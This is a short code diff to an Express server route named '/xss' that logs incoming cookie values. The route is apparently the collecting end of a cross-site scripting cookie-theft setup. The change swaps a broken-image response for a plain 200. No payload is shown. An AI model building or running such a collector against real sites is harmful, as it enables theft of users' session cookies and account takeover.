@@ -16,7 +16,8 @@ app.get('/xss', (req, res) => {
         console.log('Received cookie:', cookieValue); 
         // console.log(req)
         // res.redirect(referer);
-        res.sendFile(brokenImagePath)
+        // res.sendFile(brokenImagePath)
+        res.send(200)
     }
 })
 
